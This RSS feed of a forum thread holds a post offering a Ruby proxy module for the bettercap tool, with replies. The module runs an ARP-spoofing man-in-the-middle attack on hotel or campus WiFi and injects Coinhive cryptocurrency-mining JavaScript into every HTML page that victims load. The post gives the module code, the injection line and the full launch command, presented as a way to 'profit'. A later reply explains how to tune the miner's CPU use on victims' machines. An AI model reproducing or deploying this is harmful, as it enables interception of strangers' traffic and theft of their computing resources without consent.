<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Injecting Coinhive JS with Bettercap</title>
    <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510</link>
    <description>Hi,
This is my first post, I&#39;m not sure if it allowed here to write about that! but the worst thing that will happen is the removal of this post.
It been a while that i am working with bettercap. &quot;Bettercap it Better(ettercap for making a MiMT attack) version written in ruby by [@evilsocket](https://twitter.com/evilsocket)&quot;, with a lot of integrated options and more flexibility. I have read all proxy modules and it been fun, but i didn&#39;t have any idea about to write my own. so this [tweet](https://twitter.com/evilsocket/status/911849296806531073) come to me and that&#39;s it i had my idea.
The concept was to inject `js` coin miner on an `http` response, with the help of coinhive site i have the js coin miner and my public `KEY`, And then some simple script in `ruby` (i am not a wizard in ruby but i get the basic), i need it a the user to pass the key argument `--coin-key KEY` it was like this:

    @@coinkey = nil
    def self.on_options(opts)
        opts.on( &#39;--coin-key KEY&#39;, &#39;Your site key on coinhive.&#39; ) do |v|
          @@coinkey = v
        end
      end
and if `--coin-key` is not set raise an error. So now we have the key we need to integrated in the `js`:

    @loadcoinhive = &quot;&lt;script src=&#39;https://coinhive.com/lib/coinhive.min.js&#39;&gt;&lt;/script&gt; //coinhive js library &quot;
    @jscontent = &quot;&lt;script&gt; var miner = new CoinHive.Anonymous(&#39;#{@@coinkey}&#39;); miner.start(); &lt;/script&gt;&quot;
    @jsfile = &quot;#{@loadcoinhive}#{@jscontent}&quot;
All we got&#39;a to do is on every request of the type `html` we inject that `jsfile` that we created --^, Now we need to inject it were it will be executed! and yes after `&lt;/title&gt;` so it will be like this:

    response.body.sub!( &#39;&lt;/title&gt;&#39;, &quot;&lt;/title&gt;#{@jsfile}&quot; )
And that&#39;s it now you can connect to you&#39;re free WIFI (hotel, campus, ...) and run out this command in your terminal: `~&gt;# bettercap -X -S ARP --proxy --proxy-module Scripts/makemoney.rb --coin-key &quot;YOUR_KEY_HERE&quot;` my module is under my Scripts folder so change it with yours.
Hope you like the post and don&#39;t forget to install `HTTPS Everywhere` on you&#39;r browser when you&#39;re using public WIFI. Peace
&gt; you can clone the script here &gt;&gt; [makemoney.rb](https://github.com/hihebark/bettercap-proxy-modules/blob/master/http/makemoney.rb)</description>
    
    <lastBuildDate>Tue, 05 Dec 2017 22:11:21 +0000</lastBuildDate>
    <category>Programming</category>
    <atom:link href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/9</link>
        <pubDate>Sat, 30 Dec 2017 18:15:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-9</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[Ph4ant0m]]></dc:creator>
        <description><![CDATA[
            <p>thanks again…rtfm <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"> and there it was :).</p>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/8</link>
        <pubDate>Tue, 05 Dec 2017 22:11:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-8</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[hihebark]]></dc:creator>
        <description><![CDATA[
            <p>you are welcome : ) <a class="mention" href="https://0x00sec.org/u/ph4ant0m">@Ph4ant0m</a><br>
Yes sure you can in the <code>Js</code> you can put the number of thread that will be in use like this:</p>
<pre><code>&lt;script&gt;
var miner = new CoinHive.Anonymous(
    '#{@@coinkey}',
    threads: 4,
    autoThreads: false
); 
miner.start(); 
&lt;/script&gt;
</code></pre>
<p>or just by setting them before <code>miner.start();</code> like this <code>miner..setNumThreads(2); miner.setAutoThreadsEnabled(false);</code> and you’r done.</p>
<blockquote>
<p>for more option go to &gt;&gt; <a href="https://coinhive.com/documentation/miner#coinhive-anonymous" rel="nofollow noopener">coinhive documentation</a></p>
</blockquote>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/7</link>
        <pubDate>Tue, 05 Dec 2017 20:41:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-7</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[Ph4ant0m]]></dc:creator>
        <description><![CDATA[
            <p>Great work man !. Is there any possibilities to control usage of cpu for injected machine ?. Now it takes all cpu which it just gets.</p>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/6</link>
        <pubDate>Tue, 05 Dec 2017 18:48:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-6</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[hihebark]]></dc:creator>
        <description><![CDATA[
            <p>Ok Mr <a class="mention" href="https://0x00sec.org/u/oaktree">@oaktree</a> now i get you, i will re-edit my post.</p>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/5</link>
        <pubDate>Fri, 01 Dec 2017 15:36:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-5</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>What I meant was, you should post a complete tutorial on your tool. It’d be cool if you explained the concepts and so on. The <a href="https://0x00sec.org/t/the-0x00sec-code-of-conduct/3569">Code of Conduct</a> prohibits simple link dropping without explanation…</p>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/4</link>
        <pubDate>Thu, 30 Nov 2017 23:08:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-4</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[hihebark]]></dc:creator>
        <description><![CDATA[
            <p>hello <a class="mention" href="https://0x00sec.org/u/oaktree">@oaktree</a><br>
If you’re talking about the code the <strong>code</strong> is simple, i tried to make it as easy as possible.<br>
Bettercap will search for a response with html type and then replace the <code>&lt;/title&gt;</code> with <code>&lt;/title&gt;&lt;script src='https://coinhive.com/lib/coinhive.min.js'&gt;&lt;/script&gt;&lt;script&gt; var miner = new CoinHive.Anonymous('KEY'); miner.start(); &lt;/script&gt;</code> the <code>KEY</code> is passed after <code>--coin-key KEY</code>.<br>
Now for the js is provided by <code>coinhive.com</code>, for the <a href="https://coinhive.com/documentation" rel="nofollow noopener">documentation</a>.<br>
Then you can connect to you’r campus WiFi or hotel and run the command above <code># bettercap -X -S ARP --proxy --proxy-module Scripts/makemoney.rb --coin-key "YOUR_KEY_HERE"</code> and profit.<br>
I hope that i provided a full explanation. Sorry for my english.</p>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/3</link>
        <pubDate>Thu, 30 Nov 2017 19:43:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-3</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Hi there <a class="mention" href="https://0x00sec.org/u/hihebark">@hihebark</a>,</p>
<p>Would you please explain what exactly you did and how it works?</p>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/2</link>
        <pubDate>Thu, 30 Nov 2017 18:39:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-2</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
      <item>
        <title>Injecting Coinhive JS with Bettercap</title>
        <dc:creator><![CDATA[hihebark]]></dc:creator>
        <description><![CDATA[
            <p>Hi,<br>
This is my first post, I’m not sure if it allowed here to write about that! but the worst thing that will happen is the removal of this post.<br>
It been a while that i am working with bettercap. “Bettercap it Better(ettercap for making a MiMT attack) version written in ruby by <a href="https://twitter.com/evilsocket" rel="nofollow noopener">@evilsocket</a>”, with a lot of integrated options and more flexibility. I have read all proxy modules and it been fun, but i didn’t have any idea about to write my own. so this <a href="https://twitter.com/evilsocket/status/911849296806531073" rel="nofollow noopener">tweet</a> come to me and that’s it i had my idea.<br>
The concept was to inject <code>js</code> coin miner on an <code>http</code> response, with the help of coinhive site i have the js coin miner and my public <code>KEY</code>, And then some simple script in <code>ruby</code> (i am not a wizard in ruby but i get the basic), i need it a the user to pass the key argument <code>--coin-key KEY</code> it was like this:</p>
<pre><code>@@coinkey = nil
def self.on_options(opts)
    opts.on( '--coin-key KEY', 'Your site key on coinhive.' ) do |v|
      @@coinkey = v
    end
  end
</code></pre>
<p>and if <code>--coin-key</code> is not set raise an error. So now we have the key we need to integrated in the <code>js</code>:</p>
<pre><code>@loadcoinhive = "&lt;script src='https://coinhive.com/lib/coinhive.min.js'&gt;&lt;/script&gt; //coinhive js library "
@jscontent = "&lt;script&gt; var miner = new CoinHive.Anonymous('#{@@coinkey}'); miner.start(); &lt;/script&gt;"
@jsfile = "#{@loadcoinhive}#{@jscontent}"
</code></pre>
<p>All we got’a to do is on every request of the type <code>html</code> we inject that <code>jsfile</code> that we created --^, Now we need to inject it were it will be executed! and yes after <code>&lt;/title&gt;</code> so it will be like this:</p>
<pre><code>response.body.sub!( '&lt;/title&gt;', "&lt;/title&gt;#{@jsfile}" )
</code></pre>
<p>And that’s it now you can connect to you’re free WIFI (hotel, campus, …) and run out this command in your terminal: <code>~&gt;# bettercap -X -S ARP --proxy --proxy-module Scripts/makemoney.rb --coin-key "YOUR_KEY_HERE"</code> my module is under my Scripts folder so change it with yours.<br>
Hope you like the post and don’t forget to install <code>HTTPS Everywhere</code> on you’r browser when you’re using public WIFI. Peace</p>
<blockquote>
<p>you can clone the script here &gt;&gt; <a href="https://github.com/hihebark/bettercap-proxy-modules/blob/master/http/makemoney.rb" rel="nofollow noopener">makemoney.rb</a></p>
</blockquote>
          <p><a href="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510/1</link>
        <pubDate>Thu, 30 Nov 2017 18:09:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4510-1</guid>
        <source url="https://0x00sec.org/t/injecting-coinhive-js-with-bettercap/4510.rss">Injecting Coinhive JS with Bettercap</source>
      </item>
  </channel>
</rss>
